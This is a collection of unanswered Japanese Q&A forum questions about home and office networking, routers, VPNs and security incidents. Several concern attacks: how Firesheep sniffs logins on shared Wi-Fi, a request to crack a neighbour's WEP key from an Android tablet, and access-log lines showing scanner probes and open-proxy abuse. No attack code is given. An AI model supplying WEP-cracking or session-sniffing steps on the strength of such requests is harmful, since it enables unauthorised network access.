Firesheepは AとBのPCが同一の無線環境にあるとして、 AのPCにFiresheepを入れると BのPCのログイン情報をキャプチャできてしまう というものらしいのですが 私には、なぜキャプチャ出来るのかが不思議です Firesheepについて色々調べてみたよ。 http://togetter.com/li/63191 以下ののような構成だったらAがキャプチャ出来るのはなんとなく分かりますが [デフォルトゲートウェイ]--無線--[A(経由)]--無線--[B] 普通はルータにこんな形で繋がっていると思います [A]--無線--[デフォルトゲートウェイ]--無線--[B] 上記の形でキャプチャができると言うのはどういう仕組みからなんでしょうか？？ ・無線接続の場合はネットワーク内全PCに通信情報が流れている ・ルータは通信情報を垂れ流している（んなアホな） 上級者の方、なんとなく予想がつく先輩方が見ていましたら お教え頂けると嬉しいです。
今、個人用のホームページを作成していましてレンタルサーバーをどれにしようか迷っています。 おすすめのレンタルサーバーをご教示ねがいます。 ホームページは、クラブチームのホームページです。
スイッチの管理について質問です。 会社の都合でデモ機も借りれずメーカーや販売店に質問もできないので、ご回答いただくと助かります。 （情報統制やセキュリティ云々が目的ではなく、上司のメンツの問題です…。） いろいろな突っ込みどころがあると思いますが、流してください…。 HPのProCurveスイッチ等、管理型のL3スイッチを購入予定です。価格帯は低いほうです。 スイッチの管理画面は、WebブラウザもしくはPCとシリアルケーブルで接続してのコマンドベースの管理画面があります。 当然かもしれませんが、コマンドベースの管理画面のほうが機能が豊富で、私が頻繁に使用したい機能もそちらにあります。 したがって、シリアルケーブルをつなげた専用PCをスイッチのそばに置いておこうと思いましたが、購入したスイッチはサーバルームに設置し、上司の指示で基本的に誰も入れなくなりますので、専用PCを置いておいても直接は触れられません。 質問です。 専用PCをスイッチにシリアルケーブルとLANケーブルで接続しておき、遠所から専用PCをリモートデスクトップで操作すれば問題は解決すると思いますが、それは可能だと思いますでしょうか。 還流とは異なるでしょうけど、スイッチと２重につながっている状態です。 ※HPのProCurveスイッチに限って言えば、シリアル接続したPCでスイッチの管理画面を開いても、スイッチの動作が止まったりすることはないらしいです。
ブラウザでPDFファイルをダウンロードする際に、あるサイトのPDFファイルをダウンロードしようとすると「このファイルを開くか保存するか」を聞いてきます。他のサイトのPDFファイルをダウンロードする際にはこのメッセージは表示されません。 また、他の人のPCでそのPDFファイルをダウンロードしようとした際にはメッセージは表示されません。 どの様な原因が考えられるでしょうか?
質問お願いします。 現場でネットワークの設定のし過ぎで、その時に使用していたパソコンがおかしくなりました。 コマンドプロンプトでrelaeseかけてrenewすると、有線でIPアドレス取得できるようになるんですが（ネットも繋がる）、無線だと何度renewしてもIPアドレス取得できません。有線でも何度もrenewしないとipアドレス取れなくなりました。 他のパソコンは問題なしです。 WIFIもスマホで使えてます。 設定に使っていたノートパソコンのみがアドレス取れなくて困っています。 システムの復元もしました。 メーカーサイトからドライバーの更新もしました。 セキュリティーソフトもアンインストールしました。 関係ないとは思いますが、サイトの履歴の削除もしました。 放電もしました。 ipconfigで見ると、 IPv4　アドレス・・・169.254.164.235 サブネットマスク・・・255.255.0.0. デフォルトゲートウェイ・・・空欄　です。（うちは192.168.1.1が正解） プロパティからipアドレス等すべて設定しても繋がりません。 どなたか詳しいい方、ご教示願えませんでしょうか。 よろしくお願いします。
パケット盗聴された場合の対処として、プロバイダ変更は効果ありますでしょうか。 無知のまま相手に誘導されたURLにアクセスし、 プロバイダ等聞かれた事に答えた後日、以後の履歴を探られていたようです。 相手の仕事は市場調査らしいので、ディープ・パケット・インスペクション（ＤＰＩ）この辺だと思うのですが… 階層としては大分上の方で盗聴している可能性があります。 IP変える（電源落とす）、相手のURLにアクセスしない、追跡防止＆フィルター、履歴削除 に加えてキッパリ切る方法はありますか？ どうかよろしくお願いします。
質問お願いします。 ウェブカメラ（監視カメラ・canonVBC60）を外出先から見たいのですがうまくいきません。 これは固定IPアドレスを必要とするものなので、固定IPアドレス（グローバルIPアドレス）を契約しています。 CTU→「PPPoE」機能ON 配線は、ONU→WAN側→CTU→WAN側→BHR-4RV BHR-4RVの設定画面でプロバイダー情報を設定。 インターネットには接続完了。 と、ここまでは出来たのですが、固定IPアドレスを設定する方法が分かりません。 http://buffalo.jp/download/manual/html/bro180/ma … 上記URLで設定してみましたが、うまくいかないのは何が原因と考えればいいでしょうか。 CTUやルーター側に何か間違い等あれば教えてください。 どうぞよろしくお願いします。
ディレクトリのアクセス権限を制御 or フォルダ/ファイルに パスワードをかける方法を教えて頂けないでしょうか？ 他のPCやHDDに移動してもそのフォルダやファイル開いた際 パスワードを要求する方法はあるのでしょうか？
自宅にVPN鯖を立てていて、VPN越しでiPhoneアプリを使ってひかり電話を利用したいのですが、 上手く認識されません。 構成は以下です。 ============================================ ルータ ：PR-400MI (NTTからのレンタル） VPN鯖 ：TurboNAS TS-112のVPN鯖機能 プロトコル ：PPTP SIPクライアント：AGEphoneというiPhone無料アプリ 補足 ：VPNはIP指定ではなく、DDNS設定により特定のドメイン(xxxx.2y.net)で 自宅につながるようにしています。 ============================================ iPhoneからのVPN接続自体は出来ています。 ※ルータの「静的IPマスカレード設定」で、VPNのポート(1723)を開放しています。 また、VPNではなく自宅のローカルエリアネットワーク内では、 iPhoneのAGEphoneアプリを子機にして、ひかり電話による通話が 問題なく行えている状態です。 VPN経由でAGEphoneを起動した場合のみ、子機として上手く認識されず、AGEphoneに 「レジスターに失敗しました。(408)」というエラーが表示されてしまいます。 ルータの設定が何か足りないのだろうといろいろ設定をいじってみたのですが、上手くいきません。 上手くいかいない原因、対応方法などご存知でしたら、ご教示ください。
外部に公開しているDNSサーバでわからないことがあります。 例えば、web.test.comドメインがあったとして その配下に、 ns1.web.test.com(DNSサーバ) web1.web.test.com(web1サーバ) web2.web.test.com(web2サーバ) mail1.web.test.com(mai1サーバ) 設定がbindで行われているとします。 ns1.web.test.comサーバにて ns1=NSレコード web1=INレコード web2=INレコード mail1=MXレコード という設定になるかな とおもっています。 このとき、web.test.comドメインで管理している INレコードをインターネット上の端末から 取得することは出来ないのが普通なのでしょうか？(取得できる=セキュリティが良くない？) (set type=MX | NS とすればMXまたはNSレコードが取得できるのは知っているのですが。) Windowsのnslookupで取得できないか考えております。 ご教授よろしくお願いします。
あるファイルfile1.txt のハッシュ値を計算してその結果を記載したファイル file2.txt のデータは、 Hash SHA1 hashsize=20 C1 14 ...... 4F のように、 先頭に、方式 1行あけて、サイズ 次の行に、計算したハッシュ値 となっているのでしょうか？ 参考になる資料がありましたらよろしくお願いします。 なお、上の値は、 RFC6234　にある、ソフトを動かした結果です。 よろしくお願いします。
お世話になります。 ソニールームリンクについて教えていただけますか。 テレビはソニーKDL－４６HX８０R（サーバー機能付/以下テレビと呼びます） ルーターは（古いですが）バファローのWHR-HP－G54 PCはWindows８・XPの二台 NASはWD社　MyBookLive１TB iPad（WD２goというアプリでNAS内のものは閲覧できます） 以上で家庭内のネットワークを組んでいます。 まず、テレビに録画されたものをWindows８のPCかiPadから見れないものかとソニーのサポートでテレビの設定しました。http://www.sony.jp/support/dlna/settings/home/s_ … その結果、PCのネットワーク上にテレビが見え、「録画一覧」ではなく「ビデオ」を見るとテレビに録画されたものの一覧が出てきたのですが、クリックすると(1)のようなWindowsメディアプレイヤーのエラーメッセージが現れて再生できません。 テレビの「クライアント登録機器機器一覧」を見ると「dc:77:～」とかMacアドレス（？）というのでしょうかが見えます。 以上の状況でネットワークに詳しい方には不要な文言だったり詳細が足りなかったりしているかとは思いますが、補足説明等はいたしますので良きアドバイスをお願いします。 将来的にはiPadからもテレビ録画されたものを見れるようにと思っております。 よろしくお願いします。
質問させてください。 現在LANポート４つルーターから ・無線LAN（Mac7台および複合機1台が使用） ・PC1台（無線LANポートなし） ・PC1台（無線LANポートなし） ・複合機1台（無線LANポートなし） という構成となっております。 また無線LANのベースステーションからHDD（ミラーリング）を外付けし、それを簡易的なファイルサーバーとして利用しております（毎日深夜帯にバックアップ） さてそこでです。どうも最近ルーターの調子がおかしく、ネットワークが途切れ途切れとなる状況が発生しております。 これを機にルーターを買い換え、また構成を再構築しようと考えております（PC等のリソースは現状を維持）。 なお注釈ですが、経緯として以前６０台程度のPCを常時接続していた会社でした。ですが、業務刷新で人を減らし現在１０人以下のヒューマンリソースとなり、１室サーバールームを設けておりましたが、現在は別用途として使用しており、サーバーは排除してしまい現在に落ち着いております。 小規模でお恥ずかしいですが、構成やルーターの機種等アドバイスを何卒ご教示よろしくお願いいたします。
こんにちは。現在自宅サーバーを作っているものです。 先日パソコンAにwebサーバーを作りました。そのパソコン自身からはindex.htmlが見えます。 しかし、同じローカル下にあるパソコンBからhttp://＜192.で始まるパソコンAのローカルIP>で接続してもindex.htmlが見れません。 現在試したこと、分かったことは以下です。 ・ファイアウォールを停止(service iptables stop)をするとパソコンBからindex.htmlがみれる ・DDNSを既に登録しており、外部からhttp://<登録したホスト名>で接続するとindex.htmlが見れる ・パソコンBからパソコンAへのローカルipへのpingは応答が確認されている ・iptablesには以下の3つを追加 /sbin/iptables -A INPUT -p tcp --dport http -j ACCEPT /sbin/iptables -A INPUT -p tcp --dport https -j ACCEPT /sbin/iptables -A INPUT -s 192.168.11.0/24 -j ACCEPT ファイアウォールを停止すると接続できるできることからiptablesに問題があると思うのですが、なにを削除、もしくは追加すればいいのか分かりません。 よろしくお願いします。
フリーウエアのRSA暗号ソフトで、鍵の長さが 1024ビットから2048ビット程度まで扱える もので、 お勧めのものがありましたら紹介して下さい。 鍵作成の時間も分かりましたら教えて下さい。 最近、フリーメールの乗っ取りなどの話題もあり、 暗号化に興味があります。 よろしくお願いします。
いきなりで失礼します。 ブラウザを起動していないのにシステムモニタのネットワーク欄に平均3KB/sec位で受信が表示されています。 netstat -sとするとipに不正なアドレス30件と表示されていてウィルスに感染していないか不安です。 何か対策をすべきなのでしょうか? また、対策するとしたらどの様な対策を行うべきなのでしょうか? 教えていただけると幸いです。
インターネットができている上位のYAMAHAルーターのLANからBUFFALO無線ルーターWZR-HP-G450HAのWANに接続して無線でインターネットをしているのですが、「アドレス変換」のチェックを外すとインターネットができなくなります。（デフォルトはチェックが入っている：有効） 原因わかる方いらっしゃるでしょうか。 よろしくお願い致します。 図 インターネット－－－[WAN：YAMAHAルーター：LAN]－－－[WAN：WZR-HP-G450HA：LAN]－－－無線LAN－－－PC
私の使っているパソコンはGatewayで、最近ルーターで、無線を使ってネットをするようになりました。設定は業者さんがしてくれたのですが、（eo光）ネットで作業していると、途中、画面が止まり、クリック音が何度も鳴り出して、 『エラーが発生したため～～を終了します。エラーを～～に送信しますか？』などと表示され、作業中のネット画面ごと消えてしまいます。 詳しい方、解決策をＰＣ初心者にもわかりやすいように教えてください！
趣味で複数の固定IPを使いたいため IP Unnumbered機能の付いたルータを探しているのですが NEC（Aterm）など信頼性の高い会社から出ていたものは ほとんど販売中止になっていました NEC（Aterm）に最近のルータはなぜIP Unnumbered機能が 付いていないのかと問い合わせたところ コールセンターには詳しい情報はないが、 なんらかの理由で対応をやめたとの返答を頂きました。 予想としては 1.IP Unnumbered技術がトラブルの多いものだったため 2.IP Unnumbered機能を求める人が稀なため あたりなのでしょうか？？ 最近のルータにIP Unnumbered機能が付いていないのは どういった理由によるものなのか 詳しい方がいたらお教え頂きたいです。
いつもお世話になります。 会社のパソコンで、事務所内に2つパソコンがありまして有線LANでつないでいます。 メインパソコンの共有フォルダをサブのパソコンから開毛ていたのが、突然できなくなりました。 「～リンク先ドライブまたはネットワーク接続が利用できません。～」と出ます。 心当たりとしては、サブのパソコンにPLANEXのアクセスポイントを取り付けた事です。 念のため上記のアクセスポイントのソフトをアンインストールしてみたり、両パソコンの設定を見直しましたが駄目でした。 PLANEXのQ＆Aなどは調べてみましたが解決には至りませんでした。 なにかお心当たりがありましたらお願いいたします。 パソコンはどちらもXPです。
この一年の間、私の個人情報が特定の友人に知られている感じがしています。 SNSで繋がっている友人で、実際にも知り合いです。会うことはありません。 漏れている気がする個人情報と言うのが、私の家族か彼氏しか知らないようなことです。 例えば、私が現在読んでいる本、彼氏とデートに行った店、その時、車内で聴いている曲、内緒で相談したメール占いの内容などについて、その友人がSNSに書いてきます。 同じタイミングで同じ本を読んだり、同じ曲を聞いたりするものでしょうか？ また、彼氏とデートした店(全く有名店ではありません。しかも複数店について。)に偶然行くものでしょうか？ 最初は偶然だと思っていました。 しかし、一年続くとさすがに違和感を感じるようになりました。 この友人は、最近は私の生活圏内に来ています。 ニアミスと言う時もよくあります。 私とこの友人の生活圏は数十キロは離れています。 また、最近知ったのですが私の勤務する会社の人と知り合いになっていました。 私の現実の友達とも知り合いになっていました。 驚きました。 この友人とはSNSでしか繋がっていません。 私は勤務する会社は教えていますが、私の家や彼氏の情報は教えていません。 私のSNSの友達はこの友人と他県に住む友人だけです。 他に非公開グループに属していますが、そのグループの友人とは友達にはなっていません。 SNSにはプライベートが分かるようなことは載せていませんし、あまりログインもしません。 しかし、たまにログインすると、その特定の友人が前述のような私の個人情報に触れるようなことを書いていたり、私の好きな作家、アーティスト、趣味のリンクを貼っています。 再度書きますが、最初は偶然、趣味が合う人なんだなあくらいに思っていました。あまりにもタイミングがいいので好意さえ感じていました。 気になるのが、その友人はGoogleカメラ？から撮った私の行動範囲の映像を載せていたりすることもあります。 また、その友人のSNSの友達(私とは友達ではありません。その友人の現実の友達です。)が、私がよく使うネタや以前に書いた記事と関連するような記事を公開で載せてきます。 私が彼氏と遊びに行ったテーマパーク(メジャーではない上、遠方)の写真を載せていた時もあります。 ちなみに、私はSNSの友達リストは隠しています。記事の公開範囲は友達にしており、公開記事は友達のでもスルーしています。 ちなみに、SNSに登録しているアドレスはフリーメールアドレスです。そこから私の現実に付き合いがある人が分かることはありません。 話しは変わりますが、ヤフーIDも知られているような気がしています。 知恵袋で私が質問すると、その友人はSNSに回答のヒントらしきもの？を載せていました。 メールはログインシールを使っています。 ここ最近は会社の人にもヤフーの個人情報が知られている気がしています。 私はヤフオクで買い物をするのですが、会社に私の服装を真似？というか、似たコーディネートをしてくる人がいます。ヤフオクでウォッチリストに入れている服や落札した服と似た服を買って着てくることが増えました。 何故か被るのはヤフオクだけで、店舗で買った服は被ったことはありません。 バーゲンセールで買ったブランドの洋服を着て行った時はその人は不機嫌でした。 話しを戻します。 その友人はIT関係に明るく、携帯、スマホなどは数台持っており、PCソフトも普通の人がなかなか持たないものも持っています。 またエンジニアの友人もいます。 支離滅裂な文章で申し訳ありません。 また自分で書いていても、やはり私の妄想にしか思えないです。 この友人が私の身内しかしらない個人情報を知ることなんて出来ませんよね？ やはりただの偶然でしょうか？ こんな話、誰にも相談できなくて思いきってこちらで相談しました。 ご意見お聞かせ願います。 ちなみに、SNSでたまたまフリーメールでやりとりした知り合いの方といつの間にか友達になった時、SNSからくるメールが急に迷惑メールに入るようになりました。 私はしばらく気がつきませんでした。 もちろん、私は何も操作していません。 変な質問で申し訳ありません。
私は、CCNAを取得するためネットワークの勉強をしているものです。 OSI参照モデルとTCP/IPについてですが、現在普及しているのはTCP/IPなのでしょうか？ ならばOSI参照モデルとは一体なんなのか・・・？？ ただ、TCP/IPとの比較に使われているだけでしょうか？ あまり深く考える必要はないのでしょうか・・・ 非常にレベルの低い質問で大変恐縮ですが、 どなたか教えて頂けると幸いです。
お世話になります。 PCのOSはWindows８ ルーターはバッファロー社のWHR-HP－G54 NASはWD社のMy Book Live(1TB) これらをLANで接続して（まだ完了しておりませんが、写真(1)の様に）バックアップもほぼ完了しております。 問題はネットワーク上にあるMy Book Live（きちんと認識はされているようです）のフォルダーを開くと空のフォルダーしか見えないことなんです。（いったい１００Gb以上もバックアップされたものはどこにあるのでしょうか？それとも、付属ソフトで見える様に設定等をしないといけないのでしょうか） WD社のサポート・マニュアル等にもこのような事例が（おそらく）載っていなくて困っております。 （それとも、バックアップが完全に完了しないと見えないものなのでしょうか？） ネットワーク初心者で困っております。 適切なアドバイスがございましたら、よろしくお願いします。 なお、追加のご説明が必要な場合は少し時間が掛るかとは思いますが、必ずご返信いたしますので是非ともアドバイスよろしくお願いします。
OSがアンドロイドのタブレットPCを買いまして現在タブレット生活を有意義に過ごしているのですが 会社の同僚が(昔からの幼馴染みで家も実家暮らしで隣同士)私と同じようにタブレット端末を買ったそうなのですが、WEPキーが分からないそうです。 案の定親に聞くやら機械の横に書いてあるーとかは言いましたがなんでも彼の両親が現在夫婦旅行中らしく、WEPキーの書かれいていると思われる機械は親父さんの部屋にあるらしく、鍵がかかっていていて手も足もでないそうです。もちろん彼にも我慢を促しましたがどうも我慢しにくいようで..部屋の鍵も親父さんがもっていってしまったようです。きちんと彼の親に連絡させてもらい、私ならということでWEPキーを解析できるんなら解析してえーよーっとのことなので解析したいのですが... 現在現役バリバリだったWindowsエックスピーちゃんは修理中でしてまともに使えるのはタブレットPCのみです.... 彼の無線は私の家まで飛んでいて私の家のも彼のところに届いており私の家のを貸したいのですが個人情報が云々と親は反対していて.... つまり Android端末のタブレットpcだけでWEPキーを解析できないでしょうか？ 上に記したように悪用は致しません。どうか宜しく御願い致します。
　PCのメールアドレスに情報は、どこまで守られるのでしょう？ 例えば、ライブドア、goo、yahoo、ホットメールなどは、プライバシーの個人情報は、法的な問い合わせが来たら、情報を見せる？とか載ってましたが、メール内容が犯罪的なモノが、受信送信してるアドレスがあったとしたら、勝手に運営側が、密告とかあるんですかね？ 何が言いたいかというと、何も問題なく生活している人がいて、メールの受信、送信が、すこしヤバめなメールしてるとか、だったら、運営側が、勝手に情報を密告するか聞きたいわけです。 なぜ、こんな質問したのかというと、メールアドレスだけで、個人特定出来るとかだったら、犯罪系メール（出会い系）とか、受信メールや送信メール見て、運営側が、密告してくたら嬉しいと思いまして。 解る方いましたら、返信下さい。
Ｉｐａｄ　ｍｉｎｉ（Wi-Fiでないタイプ）を購入しました。 パソコン同様ネットの閲覧制限がかけられると思っていましたが、出来ないようです。 APPLEストアーと自宅で契約しているプロバイダーに相談しましたが出来ないと言われ、フリーソフトがあるのではといわれました。 中学生の息子が利用するので、良い方法やお勧めソフトがあれば教えてください。 Ipadの操作については超初心者です。
Buffaloのルーター G302H を使用し優先で自作PCへつないでおります。 昨日、いきなりネットにつながらなくなりAirStationを開くと DHCPサーバーの未検出とのエラーになります。 再設定を試みましたがPCとルーター間は接続OKですがルーターから外へが エラーになってしまいます。 いきなりこんな事ってありえますか？ 考えられる原因と対応方法をご教示下さい。
初歩的な事かもしれませんが、教えて下さい。 物理的に１つのネットワーク（社内LAN）があり、IPアドレスで192.168.128.xxで構成されているのですが、ここに192.168.129.xxの機器を接続するとどうなるのでしょうか？ 192.168.128.xxと192.168.129.xxの機器とは通信する必要が無く、外部（インターネット等）の接続もありません。既存の配線を活かして新たに別ネットワークを構築したいのですが、何か問題はあるのでしょうか？ もし別々にしないといけないのであれば配線のし直しが大変なので・・・・・ 宜しくお願いします。
アパッチのログに以下のページへのアクセスがありました。 /blog/readme.html /blog/readme.html /jmx-console/ /readme.html /readme.html /xoops/modules/wordpress/readme.html サーバーの脆弱性を調べられている？んでしょうか。 ワームなどの情報がありましたら教えてください。 該当ユーザーのIPを調べても有力な情報は何も出てきませんでした。
私はWindows Phone (Is 12T ）ユーザーなのですが、先日メインで使っていたWindows Liveアカウントが乗っ取られてしまいました 発覚した理由はメインで使っていたHotmail アカウントにメールがとどかないのを不審に思ってアカウント設定画面でパスワードを入れてみたらパスワードが変更されていたことです。 パスワードの請求も考えたのですがご丁寧に登録した際に入力したアドレス、秘密の質問まで変更されていました。 友人達に聞いてみると特に英語の迷惑メールが私のアドレスから届いているなんていうこともなく、私自信クレジット関係の登録もしていなかったのですが、ネットショッピングをした際に送ったもう使っていない口座番号、氏名、昔の住所を知られてしまいました。 一応Microsoft Accountに報告したのですが、送信済みのフォルダはパスワードを入れなければロードできないので、殆ど下書きから推測で入力しました 私はメールはあまり書かないし、件名も空欄で送るタイプなのでアカウントを取り戻せる気がしません。 もし、これがだめだった場合WindowsPhoneであることを生かしてなんとかアカウントを取り戻す方法はありませんか？ また、乗っ取られたアカウントにはWindows Phone のEmail(携帯メール）も受信できる様に設定していた（今は変更しています）ので沢山の人のメールアドレスが盗まれてしまいました。 一応警察にも相談しに行こうと思うのですが、何か注意した方がいい点などはありますか？ パスワード変更の際に見たアドレス（一部伏せられていました）がhotmail.co.jpだったからといって犯人が日本に住んでいるっていう事にもならないですよね。 今の所金銭的被害もないので捕まえてもらうのはやっぱり難しいのでしょうか
　MicrosoftのFlight simulatorXというゲームでオンラインプレイをするのに直接接続という方法があり、同じゲームを持っている友人に自分のIPアドレスを教えると一緒のセッションで遊べるというものです。 　ゲームの設定で例えば215.***.***.***というようなアドレスを入力するといったものなのですが、困っているのは「ルーターを介すると相手から認識できない」ことです。ＡＤＳＬや光インターネットのモデムにＬＡＮケーブルで直接ＰＣを接続すれば相手から認識されるのですが、ルーターを介するとうまくいきません。グローバルIPは固定ではなく、動的アドレスでした。 　ルーターはBuffaloのAirStationに有線ＬＡＮで接続しています。Microsoftから公式にアナウンスされているポートのUDP:23456とUDP:6073（参考URL http://support.microsoft.com/kb/925896/ja ）、それからゲーム内に設定のあるポートUDP:6112-6122をポート変換設定しましたがうまくいきませんでした。IPフィルタという設定もあったのでInternet側→LANもLAN→Internet側のいずれも通過するように設定してみましたが、それもうまくいきませんでした。 　ルーターを介して唯一うまくいったのは、ルーターモードOFFでしたがこれはAirStationをハブとして利用しているだけのようなので、根本的な解決になっていないと思います。 インターネット－モデム－ルーター－ＰＣと接続してIP直接入力によるオンラインゲームをする方法をご存知の方がいらっしゃいましたら、詳しく教えてください。よろしくお願いします。
PCでのネットはWiMAX(USBタイプ)を使用しています。 さらにLANケーブルを使用して、PCとPS3を接続して ネット対戦をしていたのですが、ある日突然、できなくなりました(去年の30日くらいから)。 サインインがずっと接続中→接続できませんでした。 ブラウザを開くと「ページを表示できません(80710102)」 とあり、調べてみましたがよくわかりませんでした。 またWiMAX→PC→PS3の接続を調べてみると設定で、 「ローカルエリア２接続（WiMAXの接続）」でプロパティ→ 共有タブ→「ネットワークのほかのユーザーに・・・」にチャックを 入れるとあったので、調べてみたらチャックが外れていました。 チェックを入れようとしたら、 「インターネット接続の共有の有効にするときに、エラーが発生しました」 と表示されました。 これも調べて、チャックを入れようとしましたが、 (1)一度接続を切って、チャックを入れ、また接続を有効にする。 (2)QoSパケットスケジューラを削除する をやってみましたがダメでした。 最終的にPS３でネット対戦ができるようになれば良いので 対策がわかる方お願いします。 ちなみにこれが起きる前日にELECOM　Logitecの 「LAN‐W300N/U2SWH(PCを親機として周辺機器にWifiでネット可能にするもの)」 をインストールしてうまくできずに終わりました。 これが原因かもしれませんので書いておきます。
ＶＰＮの基本的な概念について、4点質問したいと思います。 1.ＶＰＮにはクライアントとＶＰＮ機器、ＶＰＮ機器による拠点間接続があり、後者は基本的にはＷＡＮ（拠点間接続は、基本的に何かしらのＶＰＮか専用網で構成されている） 2.DMZ領域にあるサーバーは、基本的にＶＰＮでアクセスはしない。ＤＭＺではおけないサーバー（ファイルサーバー）まどを外部からアクセスする際に、ＶＰＮ機器は導入を検討される。 3.端末制御（アクセス制御）や認証については、基本的にはＶＰＮ機器本体で行うのでしょうか。 （他の認証（ワンタイムパスワードのアプリ）などと組み合わせるのが一般的でしょうか） 4.IPSecとSSL-VPNの違いについて （リモートアクセスはＳＳＬ－ＶＰＮのほうが、クライアントのアプリが不要な分よいとされていますが、 何かデメリット（特定のアプリが起動しない、特定のポートしか利用できない）などはありますでしょうか。 また、拠点間ではIPSecのほうが一般的な理由はどういったものでしょうか。 長文になってしまい申し訳ございません。 ご存知の方いらっしゃいましたら、アドバイス宜しくお願いします。
パソコン監視ソフトやキーロガーなど、何らかの方法で、ネットをつうじて他人にパソコンを見られていた場合、再インストールすれば、もとの安全な状態に戻りますか？ また、パソコン監視とコマンドは関係があるものですか？ 相手側がコマンドが何たらとつぶやいていたので、何か関係があるのかと・・。 検討違いの質問ならすみません。
ＦｉｒｅＦｏｘで　ＭＮＳ産経ニュースを見ていると、 セキュリティ警告 　このページは暗号化されていますが、あなたがこのページで入力する情報は暗号化されていない接続を通して送られようとしており、第三者が簡単に傍受できます。 本当にこの情報の送信を続けてもよろしいですか？ という警告が出ます。 これは　ＰＣ内の情報等をどこかに送信しているのでしょうか。 情報を送られないようにする対策はどうしたらいいのでしょうか
最近、インターネットのブラウザに表示される画像にノイズが入っていたり、iTunes でダウンロードさせれる音楽ファイルにノイズが入っていたり、youtube の動画の読み込みに時間がかかったり途中で再生が途切れてしまうことが常に起こっています。 また、ダウンロードするファイルの CRC が毎回一致しません。 同じ LAN 上にある別の PC からなら問題ないです。 IE、Chrome で同じ現象が起きているので、ブラウザのせいではないような気がします。 以上を考慮すると、この PC 自体が故障している、或いは、無線 LAN 子機が故障している、ということが考えられるのですが、 どうやって原因を調べればよいでしょうか？ よろしくお願いします。
有料アダルトサイトに自動的に繋がってしまい、何度クローズしても立ち上がってしまいます。 どうすれば立ち上がらなくなるでしょうか？
今までデスクトップパソコンを使っていたのですが、ノートパソコンの無線ＬＡＮ付きのを買いました。 早速インターネットにアクセスしようとしたのですが、途中で「セキュリティキーの入力をしてください」の画面が出て、上手くインターネットにつながりません、セキュリティキーとは何処で調べたらいいでしょう。 打ち込む内容がわかりません。 無線ＬＡＮボードは、家のパソコンのルーターに刺しています。
どなたかご存じの方がいらっしゃいましたら、教えていただけますでしょうか。 Symantec Endpoint Protection Manager（管理）を運用していたサーバが故障したため、新しくサーバを用意し、設定しました。IPアドレスやホスト名は同じです。 Endpoint Protectionのクライアントがインストールされている端末のステータスがオフラインとなってしまいます。新しくセットアップしたサーバとの間は、通信（ポート番号：8014)出来ています。 サーバ側のクライアント一覧にも表示されません。 サーバ側で通信のエクスポートをしたファイルを、クライアント側のEndpoint Protectionでトラブルシューティングから通信の設定でインポートしようとすると、”この操作は管理下クライアントの場合にはサポート外です”というメッセージが表示され、操作ができません。 よろしくお願い致します。
ローカルPCでxamppを利用しようと考えています。 手順を書いてあるサイトを見ると、基本的にxamppのセキュリティ設定をしましょう。 ・mysqlのrootパスワード変更 ・XAMPPのディレクトリ制御 など、http://localhost/security/index.phpで警告されている箇所を直しましょうとあります。 しかし、これってローカルPCで利用する場合に設定が必要でしょうか？ サーバー上でxampp動かすなら必要でしょうが、ローカルで動かす場合はインターネットなどの外部から元々アクセスできないから必要ないと思うのですが、 本当にこの設定は必要なのでしょうか？ やっておいた方が無難だからというような理由では納得できないため、質問させていただきました。
ブラウザＯｐｅｒａで古本通信販売のサイト、「ネットオフ」で、トップページ画面で書名を入力後、enterを押すと、検索結果が表示されますが、さらにそこで書名がクリックできるようになっているので、クリックしして次のページに移行しようとすと、画面がきちんと表示されません。 真っ白になっているわけではなく、上部の方には、ネットオフのサイトとわかる表示があります。 購入画面が表示されるはずなのですが。 Ｉｎｔｅｒｎｅｔ　Ｅｘｐｌｏｒｅｒ8だとうまく購入画面にまでいくのですが、セキュリティの関係でしょうか。 ブラウザはＯｐｅｒａです。バージョンは12.12。 使用ＯＳは　WindowsXPです。
自宅PC（Windows7）から外部のPC（Windows7）にリモートデスクトップ接続したいのですが、以下のどれかが原因で接続できないと表示されます。 １）サーバーへのリモートアクセスが有効にされていない ２）リモートコンピューターの電源が入っていない ３）リモートコンピューターがネットワークで使用できない 自宅で使用しているPCを別のネットワークから接続しようとするとリモート接続できるのですが、自宅からだと接続できません。 ネットワークが異なると接続ができる、できないが変わる原因としてはどのようなことが考えられるのでしょうか？また、解決策などを教えていただけると助かります。
自宅でサーバを運用しています。 OS:Ubuntu 11.10 Apache:2.2.20-1ubuntu1.3 昨日、access.logを見ていると、妙なリクエストがありました。 xx.xx.xx.xx - - [25/Dec/2012:10:17:30 0900] "POST http://xxxxxxxx.com/?strGet=xxxx HTTP/1.1" 200 1234 "-" "-" 普通、httpdへのGET、POST、HEADなどのリクエストは、 GET / GET /index.html GET /image/foo.jpg のように、DocumentRootからの自サーバの要素に対してのみ受け付けられると思っていたのですが、上記のように、POSTで全く別のサーバにリクエストを送信しており、コード200で正常に処理されています。 アクセス先の http://xxxxxxxx.com/ （パラメータなし）にJavascriptを切ってブラウザからアクセスしてみたら（危険な行為でしたが）、ウイルスバスターにブロックされました。 アクセス元のIPアドレス xx.xx.xx.xx は whois コマンドで調べたところ、オランダのホスティングサービスのようでした。 これは自分のサーバが何らかの踏み台にされたのでしょうか。 もしそうだとしたら、Apacheへのリクエストを、自サーバのリソースに限定する方法はないでしょうか。 GET http://foo.com/ POST http://bar.com/ などを阻止したいのです。 よろしくお願いします。
今サイト構築をしているのですが、ユーザ登録されたときにユーザ専用フォルダを作成しようと思うんですが、フォルダ名はID名などわかりやすい名前にしたいのですが、不正アクセスなどセキュリティ上問題ありますか？あるのならどういった方法を取るのがいいですか？ よろしくお願いします。
　いまソニーのＦシリーズの 　ウォークマン使ってます。 　ウォークマンに携帯の曲を入れる 　ことって出来るのでしようかあ？ 　教えてください。
internet explorer 9のタブにSearch　Hereタブが知らないうちに追加された。削除する方法を教えてください。
ユーチューブの私のアカウントに何者かがアクセスを試みたとメールにて送られてきたのですが、どの様な仕組みで、私以外とわかったのでしょうか？
